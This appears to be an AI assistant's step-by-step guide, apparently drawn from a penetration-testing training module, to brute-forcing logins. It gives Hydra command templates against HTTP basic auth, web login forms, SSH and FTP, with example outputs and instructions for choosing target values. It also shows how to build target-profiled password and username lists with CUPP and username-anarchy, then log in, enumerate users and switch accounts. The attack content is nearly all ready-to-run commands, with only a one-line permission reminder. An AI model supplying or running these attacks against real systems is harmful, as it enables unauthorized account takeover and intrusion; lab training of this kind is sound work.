I’ll give you a **complete step‑by‑step guide** with **commands**, **explanations** of what to replace, and **example outputs** so you know exactly what to expect.  
I’ll highlight the parts you need to check after each step.

---

## 1. Hydra help – see what services you can attack
**Command:**  
```bash
hydra -h | grep "Supported services"
```
**What to replace:** Nothing.

**Example output:**
```
Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
```
✅ **Check:** This list shows you all protocols Hydra can attack (e.g., `http-get`, `http-post-form`, `ssh`, `ftp`).

---

## 2. Brute‑force HTTP Basic Auth with a combined wordlist (default credentials)
**Command template:**  
```bash
hydra -C /path/to/combined_wordlist.txt <target_ip> -s <port> http-get /
```
**What to replace:**
- `/path/to/combined_wordlist.txt` → the file containing `username:password` pairs.  
  Example: `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`
- `<target_ip>` → the IP address of the target (e.g., `178.211.23.155`)
- `<port>` → the port number (e.g., `31099`)

**Example command:**  
```bash
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
```

**Example output:**  
```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://178.211.23.155:31099/
[31099][http-get] host: 178.211.23.155   login: test   password: testingpw
[STATUS] attack finished for 178.211.23.155 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```
✅ **Check:** Look for a line starting with `[port][http-get]` – it shows the found `login` and `password`. In this case, `test:testingpw`.  
Then open a browser and visit `http://<target_ip>:<port>` and use those credentials to confirm.

---

## 3. Brute‑force HTTP Basic Auth with separate username and password wordlists
**Command template:**  
```bash
hydra -L /path/to/usernames.txt -P /path/to/passwords.txt -u -f <target_ip> -s <port> http-get /
```
**What to replace:**
- `/path/to/usernames.txt` → e.g., `/opt/useful/SecLists/Usernames/Names/names.txt`
- `/path/to/passwords.txt` → e.g., `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt`
- `<target_ip>` → target IP
- `<port>` → target port

**Example command:**  
```bash
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```

**Example output:**  
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task
[DATA] attacking http-get://178.35.49.134:32901/
[STATUS] 9105.00 tries/min, 9105 tries in 00:01h, 243845661 to do in 446:22h, 16 active

[32901][http-get] host: 178.35.49.134   login: thomas   password: thomas1
[STATUS] attack finished for SERVER_IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```
✅ **Check:** The same pattern – find the line with `[http-get]` that shows a valid `login:password`.  
Note: This attack can take a long time; the `-f` flag stops at the first successful pair.

---

## 4. Brute‑force a login form (POST) with a static username
**Command template:**  
```bash
hydra -l <username> -P /path/to/passwords.txt -f <target_ip> -s <port> http-post-form "<url_path>:<post_params>:F=<fail_string>"
```
**What to replace:**
- `<username>` → a single username to test (e.g., `admin`)
- `/path/to/passwords.txt` → password wordlist
- `<target_ip>`, `<port>` → target IP and port
- `<url_path>` → the login page, e.g., `/login.php`
- `<post_params>` → the POST data with placeholders `^USER^` and `^PASS^`.  
  Example: `username=^USER^&password=^PASS^`
- `<fail_string>` → a string that appears **only when login fails**.  
  Find it by viewing the HTML source of the login page (Ctrl+U) and picking something unique, like `<form name='login'`.

**How to find the POST parameters and fail string:**  
1. Open the login page in Firefox.  
2. Press `Ctrl+Shift+E` to open the Network tab.  
3. Try to log in with dummy credentials (e.g., `test:test`).  
4. Right‑click the login request → **Copy** → **Copy POST data**.  
   You’ll get something like `username=test&password=test`.  
5. The `<url_path>` is shown at the top of the request (e.g., `/login.php`).  
6. For the fail string, go to the page source (`Ctrl+U`) and search for text that only exists on the login page – e.g., the login button or a form name. In the module they used `<form name='login'`.

**Example command:**  
```bash
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

**Example output:**  
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login'

[32901][http-post-form] host: 178.35.49.134   login: admin   password: password123
[STATUS] attack finished for 178.35.49.134 (valid pair found)
```
✅ **Check:** Look for `[http-post-form]` – it shows the found `login` and `password`. Then use those to log in via the web form.

---

## 5. Create a custom password wordlist with CUPP
**Command:**  
```bash
cupp -i
```
**What to replace:** Answer the interactive questions with information about the target (first name, surname, nickname, birthdate, etc.).  
**Example interaction:**
```
> First Name: William
> Surname: Gates
> Nickname: Bill
> Birthdate (DDMMYYYY): 28101955
> Partners) name: Melinda
> Partners) nickname: Ann
> Partners) birthdate (DDMMYYYY): 15081964
> Child's name: Jennifer
> Child's nickname: Jenn
> Child's birthdate (DDMMYYYY): 26041996
> Pet's name: Nila
> Company name: Microsoft
> Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y
```
**Example output:**
```
[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to william.txt, counting 43368 words.
```
✅ **Check:** The file `william.txt` is created in the current directory. Use `ls` to verify.

---

## 6. Filter the wordlist according to a password policy
If you know the policy (e.g., password must be ≥8 chars, contain special char and number), run:
```bash
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # keep only those with a special char
sed -ri '/[0-9]+/!d' william.txt            # keep only those with a number
```
**Example output:** No output, but the file will shrink.  
✅ **Check:** Run `wc -l william.txt` before and after to see the reduction (e.g., from 43368 to ~13000).

---

## 7. Generate a custom username list
**Commands:**  
```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy <First Name> <Last Name> > usernames.txt
```
**What to replace:** `<First Name>` and `<Last Name>` with the target’s name.  
**Example:** `./username-anarchy Bill Gates > bill.txt`

**Example output:** No output, but `bill.txt` is created.  
✅ **Check:** `cat bill.txt` to see the list (e.g., `b.gates`, `bill.gates`, `bgates`, etc.).

---

## 8. Brute‑force SSH with custom wordlists
**Command template:**  
```bash
hydra -L /path/to/usernames.txt -P /path/to/passwords.txt -u -f ssh://<target_ip>:<port> -t 4
```
**What to replace:**
- `/path/to/usernames.txt` → e.g., `bill.txt`
- `/path/to/passwords.txt` → e.g., `william.txt`
- `<target_ip>` → target IP
- `<port>` → SSH port (usually 22)

**Example command:**  
```bash
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```

**Example output:**  
```
[DATA] max 4 tasks per 1 server, overall 4 tasks, 157116 login tries (l:12/p:13093), ~39279 tries per task
[DATA] attacking ssh://178.35.49.134:22/
[STATUS] 77.00 tries/min, 77 tries in 00:01h, 157039 to do in 33:60h, 4 active
[22][ssh] host: 178.35.49.134   login: b.gates   password: ...SNIP...
[STATUS] attack finished for 178.35.49.134 (valid pair found)
```
✅ **Check:** Look for a line with `[ssh]` that shows the found `login` and `password`.

---

## 9. Log in via SSH
**Command:**  
```bash
ssh <username>@<target_ip> -p <port>
```
**Example:**  
```bash
ssh b.gates@178.35.49.134 -p 22
```
When prompted, enter the password found in the previous step.

**Example output:**  
```
b.gates@178.35.49.134's password: ********
b.gates@bruteforcing:~$ whoami
b.gates
```
✅ **Check:** You should see a shell prompt. Run `whoami` to confirm the user.

---

## 10. After SSH access, enumerate other users and services
**Commands:**  
```bash
ls /home
netstat -antp | grep -i list
```
**Example output:**
```
b.gates  m.gates
```
```
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      - 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
```
✅ **Check:** Look for other users (here `m.gates`) and listening services (e.g., port 21 for FTP).

---

## 11. Brute‑force FTP locally
**Command template:**  
```bash
hydra -l <username> -P /path/to/passwords.txt ftp://127.0.0.1
```
**What to replace:**
- `<username>` → the other user found (e.g., `m.gates`)
- `/path/to/passwords.txt` → a short password list (e.g., `rockyou-10.txt`)

**Example:**  
```bash
hydra -l m.gates -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-10.txt ftp://127.0.0.1
```

**Example output:**  
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
[DATA] attacking ftp://127.0.0.1:21/
[21][ftp] host: 127.0.0.1   login: m.gates   password: <...SNIP...>
1 of 1 target successfully completed, 1 valid password found
```
✅ **Check:** The `[ftp]` line shows the password for `m.gates`.

---

## 12. Connect to FTP or switch to that user
**FTP login:**  
```bash
ftp 127.0.0.1
```
When prompted, enter `m.gates` and the password.  
**Example output:**
```
Connected to 127.0.0.1.
220 (vsFTPd 3.0.3)
Name (127.0.0.1:b.gates): m.gates
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful.
150 Here comes the directory listing.
-rw-------    1 1001     1001           33 Sep 11 00:06 flag.txt
226 Directory send OK.
```

**Switch user:**  
```bash
su - m.gates
```
Enter the password.  
**Example output:**
```
m.gates@bruteforcing:~$ whoami
m.gates
```
✅ **Check:** You should be logged in as the new user.

---

## Summary – what to replace in each command

| Placeholder               | What to put there                                   | Example                           |
|---------------------------|-----------------------------------------------------|-----------------------------------|
| `<target_ip>`             | IP address of the target                            | `178.35.49.134`                   |
| `<port>`                  | Port number                                         | `32901`                           |
| `/path/to/combined_wordlist.txt` | Path to a file with username:password pairs | `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` |
| `/path/to/usernames.txt`  | Path to a username wordlist                         | `/opt/useful/SecLists/Usernames/Names/names.txt` |
| `/path/to/passwords.txt`  | Path to a password wordlist                         | `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt` |
| `<username>`              | A single username                                   | `admin`                           |
| `<url_path>`              | The path to the login page                          | `/login.php`                      |
| `<post_params>`           | POST data with ^USER^ and ^PASS^                    | `username=^USER^&password=^PASS^` |
| `<fail_string>`           | Unique text that appears only on failed login       | `<form name='login'`              |
| `<First Name>`            | First name of the target (for username‑anarchy)     | `Bill`                            |
| `<Last Name>`             | Last name of the target                             | `Gates`                           |

**Always verify you have legal permission before attacking any target.**
